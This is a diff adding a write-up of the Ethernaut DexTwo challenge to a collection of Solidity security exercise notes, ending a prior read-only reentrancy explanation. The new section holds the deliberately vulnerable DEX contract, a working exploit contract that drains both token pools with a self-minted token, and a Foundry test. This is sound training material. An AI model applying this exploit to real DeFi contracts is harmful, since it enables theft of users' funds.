@@ -1252,3 +1252,130 @@ In this exploit, the goal is to set the `lpTokenPrice` in `VulnerableDeFiContrac
 The vulnerability lies in the `removeLiquidity` function in `ReadOnlyPool`. In the function, a `call` is made to send ether back to `msg.sender` before the `_burn` function is executed. This means that an exploiter with a malicious `receive` function can call `VulnerableDeFiContract.snapshotPrice` to manipulate `lpTokenPrice` before `removeLiquidity` completes its operations; that is, the value of `lpTokenPrice` will be calculated with a reduced ether balance and an unchanged total supply of shares (LP tokens). In `virtualPrice = address(this).balance / totalSupply();`, if `totalSupply` is more than the balance, it will return `0`.
 
 Thus in `Exploit`, the `exploit` function calls `addLiquidity` to deposit into `ReadOnlyPool`. And then calls `removeLiquidity`. While `removeLiquidity` transfers ether to `Exploit`, `Exploit`'s receive function will call `vulnerableDeFiContract.snapshotPrice()` to update the value of `lpTokenPrice` with reduced ether and unchanged total supply, resulting in `lpTokenPrice == 0`.
+
+## Ethernaut: DexTwo
+Link: https://ethernaut.openzeppelin.com/level/0xf59112032D54862E199626F55cFad4F8a3b0Fce9
+
+### Contracts
+- `src/Week10-11/DexTwo.sol`
+```
+contract DexTwo is Ownable {
+    address public token1;
+    address public token2;
+
+    constructor() Ownable(msg.sender) {}
+
+    function setTokens(address _token1, address _token2) public onlyOwner {
+        token1 = _token1;
+        token2 = _token2;
+    }
+
+    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
+        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+    }
+
+    function swap(address from, address to, uint256 amount) public {
+        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+        uint256 swapAmount = getSwapAmount(from, to, amount);
+        IERC20(from).transferFrom(msg.sender, address(this), amount);
+        IERC20(to).approve(address(this), swapAmount);
+        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+    }
+
+    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
+        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
+    }
+
+    function approve(address spender, uint256 amount) public {
+        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
+    }
+
+    function balanceOf(address token, address account) public view returns (uint256) {
+        return IERC20(token).balanceOf(account);
+    }
+}
+
+contract SwappableTokenTwo is ERC20 {
+    address private _dex;
+
+    constructor(
+        address dexInstance,
+        string memory name,
+        string memory symbol,
+        uint256 initialSupply
+    )
+        ERC20(name, symbol)
+    {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+    }
+
+    function approve(address owner, address spender, uint256 amount) public {
+        require(owner != _dex, "InvalidApprover");
+        super._approve(owner, spender, amount);
+    }
+}
+
+contract Exploit {
+    function exploit(DexTwo dexTwo, SwappableTokenTwo token1, SwappableTokenTwo token2) public {
+        //create our own token with unlimited supply and approve DexTwo to spend
+        SwappableTokenTwo exploitToken = new SwappableTokenTwo(address(dexTwo), "Exploit", "E", type(uint256).max);
+        exploitToken.approve(address(this), address(dexTwo), type(uint256).max);
+
+        //Send 100 Exploit tokens to DexTwo to manipulate balance of `from` token in `getSwapAmount`
+        //When we swap 100 Exploit tokens for token1, we will get 100 * token1.balance / exploitToken.balance
+        //which is 100 * 100 / 100 = 100 of token1 swapped out to Exploit contract
+        exploitToken.transfer(address(dexTwo), 100);
+        dexTwo.swap(address(exploitToken), address(token1), 100);
+
+        //At this point, DexTwo has 200 Exploit tokens and 100 token2.
+        //We can swap 200 Exploit tokens for token2, and we will get 200 * token2.balance / exploitToken.balance
+        //which is 200 * 100 / 200 = 100 of token2 swapped out to Exploit contract
+        dexTwo.swap(address(exploitToken), address(token2), 200);
+    }
+}
+```
+- `src/Week10-11/DexTwo.t.sol`
+```
+contract DexTwoTest is Test {
+    DexTwo dexTwoContract;
+    SwappableTokenTwo token1;
+    SwappableTokenTwo token2;
+
+    Exploit exploitContract;
+    address attackerWallet;
+
+    function setUp() public {
+        //Deploy
+        dexTwoContract = new DexTwo();
+        token1 = new SwappableTokenTwo(address(dexTwoContract), "token1", "tk1", 110);
+        token2 = new SwappableTokenTwo(address(dexTwoContract), "token2", "tk2", 110);
+        //Set up DexTwo
+        dexTwoContract.setTokens(address(token1), address(token2));
+        dexTwoContract.approve(address(dexTwoContract), 100);
+        dexTwoContract.add_liquidity(address(token1), 100);
+        dexTwoContract.add_liquidity(address(token2), 100);
+        //Transfer to attacker to start
+        attackerWallet = address(0xbeef);
+        token1.transfer(attackerWallet, 10);
+        token2.transfer(attackerWallet, 10);
+        //Deploy exploit contract
+        exploitContract = new Exploit();
+    }
+
+    function testExploit() public {
+        vm.startPrank(attackerWallet);
+        exploitContract.exploit(dexTwoContract, token1, token2);
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertEq(token1.balanceOf(address(dexTwoContract)), 0);
+        assertEq(token2.balanceOf(address(dexTwoContract)), 0);
+    }
+}
+```
+
+### Exploit
+The main vulnerability lies in `getSwapAmount`, where in calculating the amount to swap, `DexTwo` uses the `balanceOf` the `from` token. We can essentially execute a regular transfer to `DexTwo` before calling `swap` to intentionally manipulate and calculate how much of the `to` token we want to receive. Additionally, the contract doesnt have any restrictions on the `from` and `to` tokens, so even though we had added `token1` and `token2` to the Dex, we could create a random ERC20 with unlimited supply and use that as the attack vector to manipulate the swap amount. Refer to the `exploit` function in `Exploit` for the attack vector.
